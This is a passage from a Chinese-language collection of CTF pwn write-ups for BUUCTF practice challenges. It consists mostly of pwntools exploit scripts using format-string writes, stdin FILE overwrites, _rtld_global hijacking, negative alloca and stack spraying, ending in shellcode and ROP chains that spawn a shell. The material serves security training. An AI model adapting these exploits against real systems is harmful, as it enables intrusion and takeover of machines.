class="line"></span><br><span class="line">elf_path = <span class="string">&quot;./d3ctf_2019_unprintablev&quot;</span></span><br><span class="line">elf = ELF(elf_path)</span><br><span class="line">context(arch=elf.arch, log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="string">&quot;2.23&quot;</span> in libc.path:</span><br><span class="line">    one_gadget = [<span class="number">0xF1147</span>, <span class="number">0x45216</span>, <span class="number">0x4526A</span>, <span class="number">0xF02A4</span>]</span><br><span class="line">elif <span class="string">&quot;2.27&quot;</span> in libc.path:</span><br><span class="line">    one_gadget = [<span class="number">0x4F2C5</span>, <span class="number">0x4F322</span>, <span class="number">0x10A38C</span>]</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    one_gadget = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> len(sys.argv) &gt; <span class="number">1</span>:</span><br><span class="line">    remote_ip = <span class="string">&quot;node4.buuoj.cn&quot;</span></span><br><span class="line">    remote_port = <span class="number">25356</span></span><br><span class="line">    io = remote(remote_ip, remote_port)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = process(elf_path)</span><br><span class="line"></span><br><span class="line">def debug():</span><br><span class="line">    gdbscript = <span class="string">&quot;&quot;</span><span class="string">&quot;</span></span><br><span class="line"><span class="string">    b *$rebase(0xA20)</span></span><br><span class="line"><span class="string">    b *$rebase(0xB57)</span></span><br><span class="line"><span class="string">    c</span></span><br><span class="line"><span class="string">    set  *(char *)(*(unsigned long int *)$rebase(0x202020)+0x70)=2</span></span><br><span class="line"><span class="string">    c</span></span><br><span class="line"><span class="string">    c</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    c</span></span><br><span class="line"><span class="string">    c</span></span><br><span class="line"><span class="string">    c</span></span><br><span class="line"><span class="string">    c</span></span><br><span class="line"><span class="string">    c</span></span><br><span class="line"><span class="string">    c</span></span><br><span class="line"><span class="string">    c</span></span><br><span class="line"><span class="string">    c</span></span><br><span class="line"><span class="string">    c</span></span><br><span class="line"><span class="string">    c</span></span><br><span class="line"><span class="string">    c</span></span><br><span class="line"><span class="string">    c</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    c</span></span><br><span class="line"><span class="string">    c</span></span><br><span class="line"><span class="string">    c</span></span><br><span class="line"><span class="string">    c</span></span><br><span class="line"><span class="string">    c</span></span><br><span class="line"><span class="string">    c</span></span><br><span class="line"><span class="string">    c</span></span><br><span class="line"><span class="string">    c</span></span><br><span class="line"><span class="string">    c</span></span><br><span class="line"><span class="string">    c</span></span><br><span class="line"><span class="string">    c</span></span><br><span class="line"><span class="string">    c</span></span><br><span class="line"><span class="string">    c</span></span><br><span class="line"><span class="string">    &quot;</span><span class="string">&quot;&quot;</span></span><br><span class="line">    gdb.attach(io, gdbscript=gdbscript)</span><br><span class="line"></span><br><span class="line"># <span class="number">16</span>~<span class="number">96</span></span><br><span class="line">def add(size: <span class="type">int</span>):</span><br><span class="line">    sla(b<span class="string">&quot;&gt;&gt; &quot;</span>, b<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    sa(b<span class="string">&quot;size: &quot;</span>, str(size).encode())</span><br><span class="line"></span><br><span class="line">def <span class="built_in">free</span>(index: <span class="type">int</span>):</span><br><span class="line">    sla(b<span class="string">&quot;&gt;&gt; &quot;</span>, b<span class="string">&quot;3&quot;</span>)</span><br><span class="line">    sla(b<span class="string">&quot;offset: &quot;</span>, str(index).encode())</span><br><span class="line"></span><br><span class="line"><span class="meta"># def show(index: int):</span></span><br><span class="line"><span class="meta">#     sla(b<span class="string">&quot;choice :\n&quot;</span>, b<span class="string">&quot;2&quot;</span>)</span></span><br><span class="line"><span class="meta">#     sla(b<span class="string">&quot;input note id: &quot;</span>, str(index).encode())</span></span><br><span class="line"></span><br><span class="line">def edit(index: <span class="type">int</span>, content: bytes):</span><br><span class="line">    sla(b<span class="string">&quot;&gt;&gt; &quot;</span>, b<span class="string">&quot;2&quot;</span>)</span><br><span class="line">    sla(b<span class="string">&quot;age of user: &quot;</span>, str(index).encode())</span><br><span class="line">    sa(b<span class="string">&quot;username: &quot;</span>, content)</span><br><span class="line"></span><br><span class="line">def convert_str_asmencode(content: str):</span><br><span class="line">    out = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i in content:</span><br><span class="line">        out = hex(ord(i))[<span class="number">2</span>:] + out</span><br><span class="line">    out = <span class="string">&quot;0x&quot;</span> + out</span><br><span class="line">    <span class="keyword">return</span> out</span><br><span class="line"></span><br><span class="line">ru(b<span class="string">&quot;gift: &quot;</span>)</span><br><span class="line">stack_addr = <span class="type">int</span>(r(<span class="number">14</span>), <span class="number">16</span>)</span><br><span class="line">ru(b<span class="string">&quot;test!\n&quot;</span>)</span><br><span class="line">s(f<span class="string">&quot;%&#123;(stack_addr&amp;0xff)&#125;c%6$hhn&quot;</span>)</span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line">s(f<span class="string">&quot;%&#123;0x20&#125;c%10$hhn&quot;</span>)</span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line">s(f<span class="string">&quot;%&#123;0x1680&#125;c%9$hn&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta"># debug()</span></span><br><span class="line"></span><br><span class="line"># 泄露libc</span><br><span class="line">s(<span class="string">&quot;%15$p+%14$p&quot;</span>)</span><br><span class="line">libc_base = <span class="type">int</span>(r(<span class="number">14</span>), <span class="number">16</span>) - libc.sym[<span class="string">&quot;__libc_start_main&quot;</span>] - <span class="number">231</span></span><br><span class="line">ru(b<span class="string">&quot;+&quot;</span>)</span><br><span class="line">elf_base = <span class="type">int</span>(r(<span class="number">14</span>), <span class="number">16</span>) - elf.sym[<span class="string">&quot;__libc_csu_init&quot;</span>]</span><br><span class="line"></span><br><span class="line"># 修改ret_addr为leave,ret</span><br><span class="line">leave_ret = <span class="number">0x9F8</span> + elf_base</span><br><span class="line">ret_addr = stack_addr + <span class="number">0x30</span></span><br><span class="line"><span class="keyword">while</span> leave_ret != <span class="number">0</span>:</span><br><span class="line">    s(f<span class="string">&quot;%&#123;ret_addr&amp;0xff&#125;c%6$hhn&quot;</span>)</span><br><span class="line">    sleep(<span class="number">0.5</span>)</span><br><span class="line">    s(f<span class="string">&quot;%&#123;leave_ret&amp;0xff&#125;c%10$hhn&quot;</span>)</span><br><span class="line">    sleep(<span class="number">0.5</span>)</span><br><span class="line">    ret_addr += <span class="number">1</span></span><br><span class="line">    leave_ret = leave_ret &gt;&gt; <span class="number">8</span></span><br><span class="line"></span><br><span class="line">buf_addr = <span class="number">0x202060</span> + elf_base</span><br><span class="line">rbp_addr = stack_addr + <span class="number">0x28</span></span><br><span class="line"><span class="keyword">while</span> buf_addr != <span class="number">0</span>:</span><br><span class="line">    s(f<span class="string">&quot;%&#123;rbp_addr&amp;0xff&#125;c%6$hhn&quot;</span>)</span><br><span class="line">    sleep(<span class="number">0.5</span>)</span><br><span class="line">    s(f<span class="string">&quot;%&#123;buf_addr &amp;0xff&#125;c%10$hhn&quot;</span>)</span><br><span class="line">    sleep(<span class="number">0.5</span>)</span><br><span class="line">    rbp_addr += <span class="number">1</span></span><br><span class="line">    buf_addr = buf_addr &gt;&gt; <span class="number">8</span></span><br><span class="line"></span><br><span class="line"># 修复rbp</span><br><span class="line">rbp_addr = stack_addr + <span class="number">0x28</span></span><br><span class="line">s(f<span class="string">&quot;%&#123;rbp_addr&amp;0xff&#125;c%6$hhn&quot;</span>)</span><br><span class="line"></span><br><span class="line">shellcode = f<span class="string">&quot;&quot;</span><span class="string">&quot;</span></span><br><span class="line"><span class="string">xor rsi,rsi;</span></span><br><span class="line"><span class="string">xor rdx,rdx;</span></span><br><span class="line"><span class="string">push rdx;</span></span><br><span class="line"><span class="string">mov rax,&#123;convert_str_asmencode(&quot;</span>././flag<span class="string">&quot;)&#125;;</span></span><br><span class="line"><span class="string">push rax;</span></span><br><span class="line"><span class="string">mov rdi,rsp;</span></span><br><span class="line"><span class="string">xor rax,rax;</span></span><br><span class="line"><span class="string">mov al,2;</span></span><br><span class="line"><span class="string">syscall;</span></span><br><span class="line"><span class="string">mov rdi,rax;</span></span><br><span class="line"><span class="string">mov dl,0x40;</span></span><br><span class="line"><span class="string">mov rsi,rsp</span></span><br><span class="line"><span class="string">mov al,0;</span></span><br><span class="line"><span class="string">syscall;</span></span><br><span class="line"><span class="string">xor rdi,rdi;</span></span><br><span class="line"><span class="string">mov al,1;</span></span><br><span class="line"><span class="string">syscall;</span></span><br><span class="line"><span class="string">&quot;</span><span class="string">&quot;&quot;</span></span><br><span class="line">mprotect_addr = libc_base + libc.sym[<span class="string">&quot;mprotect&quot;</span>]</span><br><span class="line">pop_rdi_ret = <span class="number">0xBC3</span> + elf_base</span><br><span class="line">pop_rsi_ret = <span class="number">0x23E6A</span> + libc_base</span><br><span class="line">pop_rdx_ret = <span class="number">0x1B96</span> + libc_base</span><br><span class="line">buf_addr = <span class="number">0x202060</span> + elf_base</span><br><span class="line">payload = (</span><br><span class="line">    b<span class="string">&quot;d^3CTF\0\0&quot;</span></span><br><span class="line">    + p64(pop_rdx_ret)</span><br><span class="line">    + p64(<span class="number">7</span>)</span><br><span class="line">    + p64(pop_rsi_ret)</span><br><span class="line">    + p64(<span class="number">0x1000</span>)</span><br><span class="line">    + p64(pop_rdi_ret)</span><br><span class="line">    + p64(buf_addr &amp; <span class="number">0xFFFFFFFFFFFFF000</span>)</span><br><span class="line">    + p64(mprotect_addr)</span><br><span class="line">    + p64(buf_addr + <span class="number">0x48</span>)</span><br><span class="line">    + <span class="keyword">asm</span>(shellcode)</span><br><span class="line">)</span><br><span class="line">s(payload)</span><br><span class="line">it()</span><br></pre></td></tr></table></figure>

<h2 id="stdin任意地址写"><a href="#stdin任意地址写" class="headerlink" title="stdin任意地址写"></a>stdin任意地址写</h2><h3 id="whctf2017-stackoverflow"><a href="#whctf2017-stackoverflow" class="headerlink" title="whctf2017_stackoverflow"></a>whctf2017_stackoverflow</h3><p><a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#whctf2017_stackoverflow">BUUCTF在线评测</a></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">sa(b<span class="string">&quot;bro:&quot;</span>, b<span class="string">&quot;a&quot;</span> * <span class="number">79</span> + b<span class="string">&quot;b&quot;</span>)</span><br><span class="line">ru(b<span class="string">&quot;b&quot;</span>)</span><br><span class="line">libc_base = u64(ru(b<span class="string">&quot;\x7f&quot;</span>).ljust(<span class="number">8</span>, b<span class="string">&quot;\0&quot;</span>)) - libc.sym[<span class="string">&quot;_IO_2_1_stdout_&quot;</span>]</span><br><span class="line">sla(b<span class="string">&quot;stackoverflow: &quot;</span>, str(<span class="number">7100704</span> - <span class="number">0x18</span>).encode())</span><br><span class="line">sla(b<span class="string">&quot;stackoverflow: &quot;</span>, str(<span class="number">0x300000</span>).encode())</span><br><span class="line">sa(b<span class="string">&quot;ropchain: &quot;</span>, b<span class="string">&quot;a&quot;</span>)</span><br><span class="line"></span><br><span class="line">malloc_hook_addr = libc_base + libc.sym[<span class="string">&quot;__malloc_hook&quot;</span>]</span><br><span class="line">sa(b<span class="string">&quot;stackoverflow: &quot;</span>, b<span class="string">&quot;a&quot;</span> * <span class="number">0x18</span> + p64(malloc_hook_addr) + p64(malloc_hook_addr + <span class="number">8</span>))</span><br><span class="line">sa(b<span class="string">&quot;padding and ropchain: &quot;</span>, b<span class="string">&quot;a&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i in range(<span class="number">0x27</span>):</span><br><span class="line">    sa(b<span class="string">&quot;padding and ropchain: &quot;</span>, b<span class="string">&quot;a&quot;</span>)</span><br><span class="line">sa(b<span class="string">&quot;stackoverflow: &quot;</span>, p64(libc_base + <span class="number">0xF1147</span>))</span><br><span class="line">it()</span><br></pre></td></tr></table></figure>

<h3 id="ciscn2018-echo-back"><a href="#ciscn2018-echo-back" class="headerlink" title="ciscn2018_echo_back"></a>ciscn2018_echo_back</h3><p><a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#ciscn2018_echo_back">BUUCTF在线评测</a></p>
<p>修改IO_buf_base,之后再scanf的时候调用___IO_new_file_underflow实现往_IO_buf_base开始写入地址，就可以覆盖到buf_base,buf_ptr.这个时候同时修改他们，指向我们的ret_addr,就可以达到写入rop的效果</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">def <span class="title function_">setname</span><span class="params">(name: bytes)</span>:</span><br><span class="line">    <span class="title function_">sa</span><span class="params">(b<span class="string">&quot;choice&gt;&gt; &quot;</span>, b<span class="string">&quot;1&quot;</span>)</span></span><br><span class="line">    <span class="title function_">sa</span><span class="params">(b<span class="string">&quot;name:&quot;</span>, name)</span></span><br><span class="line"></span><br><span class="line">def <span class="title function_">echoback</span><span class="params">(payload: bytes)</span>:</span><br><span class="line">    <span class="title function_">sa</span><span class="params">(b<span class="string">&quot;choice&gt;&gt; &quot;</span>, b<span class="string">&quot;2&quot;</span>)</span></span><br><span class="line">    <span class="title function_">sla</span><span class="params">(b<span class="string">&quot;length:&quot;</span>, b<span class="string">&quot;7&quot;</span>)</span></span><br><span class="line">    <span class="title function_">s</span><span class="params">(payload)</span></span><br><span class="line"></span><br><span class="line"><span class="title function_">echoback</span><span class="params">(b<span class="string">&quot;%19$p&quot;</span>)</span></span><br><span class="line"><span class="title function_">ru</span><span class="params">(b<span class="string">&quot;say:&quot;</span>)</span></span><br><span class="line">libc_base = <span class="type">int</span>(r(<span class="number">14</span>), <span class="number">16</span>) - libc.sym[<span class="string">&quot;__libc_start_main&quot;</span>] - <span class="number">240</span></span><br><span class="line">echoback(b<span class="string">&quot;%12$p&quot;</span>)</span><br><span class="line">ru(b<span class="string">&quot;say:&quot;</span>)</span><br><span class="line">ret_addr = <span class="type">int</span>(r(<span class="number">14</span>), <span class="number">16</span>) + <span class="number">8</span></span><br><span class="line">_IO_2_1_stdin_addr = libc_base + libc.sym[<span class="string">&quot;_IO_2_1_stdin_&quot;</span>]</span><br><span class="line">_IO_2_1_stdin_addr__IO_buf_base = _IO_2_1_stdin_addr + <span class="number">56</span></span><br><span class="line">setname(p64(_IO_2_1_stdin_addr__IO_buf_base))</span><br><span class="line">echoback(b<span class="string">&quot;%16$hhn&quot;</span>)</span><br><span class="line"></span><br><span class="line">sa(b<span class="string">&quot;choice&gt;&gt;&quot;</span>, b<span class="string">&quot;2&quot;</span>)</span><br><span class="line">sa(b<span class="string">&quot;length:&quot;</span>, b<span class="string">&quot;a&quot;</span> * <span class="number">0x18</span> + p64(ret_addr) + p64(ret_addr + <span class="number">0x20</span>))</span><br><span class="line">s(b<span class="string">&quot;a&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> i in range(<span class="number">0x27</span>):</span><br><span class="line">    echoback(b<span class="string">&quot;a&quot;</span>)</span><br><span class="line">pop_rdi_ret = <span class="number">0x21102</span> + libc_base</span><br><span class="line">bin_sh_addr = libc_base + next(libc.search(b<span class="string">&quot;/bin/sh\0&quot;</span>))</span><br><span class="line">system_addr = libc_base + libc.sym[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">sa(b<span class="string">&quot;choice&gt;&gt;&quot;</span>, b<span class="string">&quot;2&quot;</span>)</span><br><span class="line">sa(b<span class="string">&quot;length:&quot;</span>, p64(pop_rdi_ret) + p64(bin_sh_addr) + p64(system_addr))</span><br><span class="line">s(b<span class="string">&quot;a&quot;</span>)</span><br><span class="line">sa(b<span class="string">&quot;choice&gt;&gt;&quot;</span>, b<span class="string">&quot;3&quot;</span>)</span><br><span class="line">it()</span><br></pre></td></tr></table></figure>

<h1 id="劫持-rtld-global函数"><a href="#劫持-rtld-global函数" class="headerlink" title="劫持_rtld_global函数"></a>劫持_rtld_global函数</h1><h2 id="dl-rtld-unlock-recursive"><a href="#dl-rtld-unlock-recursive" class="headerlink" title="_dl_rtld_unlock_recursive"></a>_dl_rtld_unlock_recursive</h2><h3 id="hctf2018-the-end"><a href="#hctf2018-the-end" class="headerlink" title="hctf2018_the_end"></a>hctf2018_the_end</h3><p><a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#hctf2018_the_end">BUUCTF在线评测 (buuoj.cn)</a></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">ru(b<span class="string">&quot;gift &quot;</span>)</span><br><span class="line">libc_base = <span class="type">int</span>(r(<span class="number">14</span>), <span class="number">16</span>) - libc.sym[<span class="string">&quot;sleep&quot;</span>]</span><br><span class="line">ld_base = libc_base + <span class="number">0x3F1000</span></span><br><span class="line">ld = ELF(<span class="string">&quot;./ld-2.27.so&quot;</span>)</span><br><span class="line">_dl_rtld_unlock_recursive = ld_base + ld.sym[<span class="string">&quot;_rtld_global&quot;</span>] + <span class="number">0xF08</span></span><br><span class="line">one_gadget_addr = libc_base + one_gadget[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">s(p64(_dl_rtld_unlock_recursive))</span><br><span class="line">s(p8(one_gadget_addr &amp; <span class="number">0xFF</span>))</span><br><span class="line">s(p64(_dl_rtld_unlock_recursive + <span class="number">1</span>))</span><br><span class="line">s(p8((one_gadget_addr &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF</span>))</span><br><span class="line">s(p64(_dl_rtld_unlock_recursive + <span class="number">2</span>))</span><br><span class="line">s(p8((one_gadget_addr &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xFF</span>))</span><br><span class="line">s(p64(_dl_rtld_unlock_recursive + <span class="number">1</span>))</span><br><span class="line">s(p8((one_gadget_addr &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF</span>))</span><br><span class="line">s(p64(_dl_rtld_unlock_recursive + <span class="number">2</span>))</span><br><span class="line">s(p8((one_gadget_addr &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xFF</span>))</span><br><span class="line"></span><br><span class="line">sl(b<span class="string">&quot;exec 1&gt;&amp;0&quot;</span>)</span><br><span class="line">it()</span><br></pre></td></tr></table></figure>

<h1 id="栈"><a href="#栈" class="headerlink" title="栈"></a>栈</h1><h2 id="alloca"><a href="#alloca" class="headerlink" title="alloca"></a>alloca</h2><h3 id="secconctf2016-cheer-msg"><a href="#secconctf2016-cheer-msg" class="headerlink" title="secconctf2016_cheer_msg"></a>secconctf2016_cheer_msg</h3><p>这个题目主要是可以把alloca的参数变成负数，这样就会导致栈迁移方向改变，进而在造成溢出<br>如果控制的好的话，这里eax就是alloca参数，如果eax是负数，那么esp就会变大，进而造成栈溢出修改main函数的返回地址<br><img src="https://cdn.nlark.com/yuque/0/2022/png/29417415/1672368143853-c1940deb-6a67-4728-a78a-614a7e069177.png#averageHue=%23fdfcfc&clientId=uf1b69e83-4320-4&from=paste&height=181&id=u16900ee0&originHeight=226&originWidth=763&originalType=binary&ratio=1&rotation=0&showTitle=false&size=18892&status=done&style=none&taskId=u1d9f508f-6a44-4cc5-9660-0a9c88ba429&title=&width=610.4" alt="image.png"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">sla(b&quot;Message Length &gt;&gt; &quot;,str(-0x80))</span><br><span class="line">payload=b&quot;a&quot;*0x10+p32(elf.plt[&quot;printf&quot;])+p32(elf.sym[&quot;main&quot;])+p32(elf.got[&quot;printf&quot;])#main函数栈溢出</span><br><span class="line">sla(b&quot;Name &gt;&gt; &quot;,payload)</span><br><span class="line">libc_base=u32(ru(b&quot;\xf7&quot;)[-4:])-libc.sym[&quot;printf&quot;]</span><br><span class="line">sla(b&quot;Message Length &gt;&gt; &quot;,str(-0x80))</span><br><span class="line">payload=b&quot;a&quot;*0x10+p32(libc_base+libc.sym[&quot;system&quot;])+b&quot;a&quot;*4+p32(libc_base+next(libc.search(b&quot;/bin/sh\0&quot;)))</span><br><span class="line">sla(b&quot;Name &gt;&gt; &quot;,payload)</span><br><span class="line">it()</span><br></pre></td></tr></table></figure>
<h2 id="溢出覆盖关键内容"><a href="#溢出覆盖关键内容" class="headerlink" title="溢出覆盖关键内容"></a>溢出覆盖关键内容</h2><h3 id="canary异常处理"><a href="#canary异常处理" class="headerlink" title="canary异常处理"></a>canary异常处理</h3><h4 id="checker-seccon-2016"><a href="#checker-seccon-2016" class="headerlink" title="checker_seccon_2016"></a>checker_seccon_2016</h4><p><img src="https://cdn.nlark.com/yuque/0/2022/png/29417415/1668344646760-ffb73414-2de3-4aa8-a300-42853b64496a.png#averageHue=%23fcfbfa&clientId=u90d578b3-3888-4&from=paste&height=203&id=u81d8d978&originHeight=254&originWidth=504&originalType=binary&ratio=1&rotation=0&showTitle=false&size=18021&status=done&style=none&taskId=ucbaec4d6-8418-4433-8a2c-1d998d2b3f5&title=&width=403.2" alt="image.png"><br>不过这个高版本被修复了,没有__libc_argv了<br><img src="https://cdn.nlark.com/yuque/0/2022/png/29417415/1668344669021-757b4195-f175-4b1d-8ab8-5e176c9339e0.png#averageHue=%23fbf9f7&clientId=u90d578b3-3888-4&from=paste&height=182&id=u55ef103e&originHeight=227&originWidth=530&originalType=binary&ratio=1&rotation=0&showTitle=false&size=27302&status=done&style=none&taskId=u2d914670-fef0-4412-9f85-d2e84c6fb0f&title=&width=424" alt="image.png"><br>所以只要覆盖__libc_argv[0]处为指向我们想要泄露的内容就可以 p __libc_argv</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">sla(b&quot;NAME : &quot;,b&quot;a&quot;)</span><br><span class="line">for i in range(8):</span><br><span class="line">    sla(b&quot;&gt;&gt;&quot;,b&quot;a&quot;*(0x180-i))#清空内容为\x00</span><br><span class="line">sla(b&quot;&gt;&gt; &quot;,b&quot;yes&quot;)</span><br><span class="line">sla(b&quot;FLAG : &quot;,b&quot;a&quot;*0x178+p64(0x6010C0))#这里不清空高位的话会错误</span><br><span class="line">it()</span><br></pre></td></tr></table></figure>
<h3 id="另一种"><a href="#另一种" class="headerlink" title="另一种"></a>另一种</h3><h4 id="pwnable-loveletter"><a href="#pwnable-loveletter" class="headerlink" title="pwnable_loveletter"></a>pwnable_loveletter</h4><p>溢出覆盖memcpy长度<br>这里的第一个字符串是e,如果只复制过来一个，那就是e<br><img src="https://cdn.nlark.com/yuque/0/2022/png/29417415/1662359706866-76fa92ea-8938-40ef-a452-2b83d03a21d0.png#averageHue=%23fdfdfd&clientId=uda01316c-ba54-4&from=paste&height=38&id=u72d1dbed&originHeight=95&originWidth=740&originalType=binary&ratio=1&rotation=0&showTitle=false&size=7252&status=done&style=none&taskId=u52bf6908-0398-490b-ac42-5c2e2a03673&title=&width=296" alt="image.png"><br>可以利用env sh -c bash aaaaaa<br>sh -c bash aaaaa,会忽视第二个参数，不管第二个输入什么，刚好可以过滤掉我们的脏内容<br><img src="https://cdn.nlark.com/yuque/0/2022/png/29417415/1662359759267-b5699e03-3318-40c0-bcc3-a99abe97afdf.png#averageHue=%23f0f0e7&clientId=uda01316c-ba54-4&from=paste&height=27&id=uf51a01c5&originHeight=67&originWidth=700&originalType=binary&ratio=1&rotation=0&showTitle=false&size=8393&status=done&style=none&taskId=u55277402-2353-4e51-b9dd-dfbabacc71f&title=&width=280" alt="image.png"><br>刚好size是在之前保存的，可以溢出<br>这里实现有问题，他会把字符串出现问题的一个字母替换三个，导致溢出，产生漏洞<br><img src="https://cdn.nlark.com/yuque/0/2022/png/29417415/1662359779275-c9ad8ac0-ee24-4da4-bd39-56a87210caf6.png#averageHue=%23fefefe&clientId=uda01316c-ba54-4&from=paste&height=176&id=uc3f811fb&originHeight=440&originWidth=789&originalType=binary&ratio=1&rotation=0&showTitle=false&size=32721&status=done&style=none&taskId=u488c2795-a100-4f26-a738-6e25ebddcbb&title=&width=315.6" alt="image.png"><br>所以可以直接溢出<br>所以整体还是很巧妙的，需要利用各种各样的条件，好题目，env,sh -c的特性也很好</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sl(b&quot;nv sh -c bash&quot;.ljust(253,b&quot; &quot;)+b&quot;`\x01&quot;)</span><br><span class="line">it()</span><br></pre></td></tr></table></figure>
<h2 id="栈喷"><a href="#栈喷" class="headerlink" title="栈喷"></a>栈喷</h2><h3 id="metasequoia-2020-snow-mountain"><a href="#metasequoia-2020-snow-mountain" class="headerlink" title="metasequoia_2020_snow_mountain"></a>metasequoia_2020_snow_mountain</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ru(b&quot;Current position: &quot;)</span><br><span class="line">stack=int(r(14),16)+0x600</span><br><span class="line">sla(b&quot;&gt; &quot;,asm(&quot;nop&quot;)*0xf00+asm(shellcraft.sh()))</span><br><span class="line">sla(b&quot;&gt; &quot;,hex(stack)[2:])</span><br><span class="line">it()</span><br></pre></td></tr></table></figure>
<p>比较简单的栈喷</p>
<h3 id="picoctf-2018-gps"><a href="#picoctf-2018-gps" class="headerlink" title="picoctf_2018_gps"></a>picoctf_2018_gps</h3><p><a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#picoctf_2018_gps">BUUCTF在线评测 (buuoj.cn)</a></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">ru(b<span class="string">&quot;Current position: &quot;</span>)</span><br><span class="line">stack_addr=<span class="type">int</span>(r(<span class="number">14</span>),<span class="number">16</span>)+<span class="number">0x300</span></span><br><span class="line">shellcode=<span class="string">&quot;&quot;</span><span class="string">&quot;</span></span><br><span class="line"><span class="string">xor rdx,rdx;</span></span><br><span class="line"><span class="string">xor rsi,rsi;</span></span><br><span class="line"><span class="string">push rsi;</span></span><br><span class="line"><span class="string">mov rax, 0x68732f2f6e69622f;</span></span><br><span class="line"><span class="string">push rax;</span></span><br><span class="line"><span class="string">mov rdi,rsp;</span></span><br><span class="line"><span class="string">xor rax,rax;</span></span><br><span class="line"><span class="string">mov al,59;</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">&quot;</span><span class="string">&quot;&quot;</span></span><br><span class="line">sla(b<span class="string">&quot;&gt; &quot;</span>,b<span class="string">&quot;\x90&quot;</span>*<span class="number">0x900</span>+<span class="keyword">asm</span>(shellcode))</span><br><span class="line">sla(b<span class="string">&quot;&gt; &quot;</span>,hex(stack_addr)[<span class="number">2</span>:])</span><br><span class="line">it()</span><br></pre></td></tr></table></figure>

<p>能划入shellcode就好</p>
<h2 id="数组越界"><a href="#数组越界" class="headerlink" title="数组越界"></a>数组越界</h2><h3 id="wdb-2022-main"><a href="#wdb-2022-main" class="headerlink" title="wdb-2022-main"></a>wdb-2022-main</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span 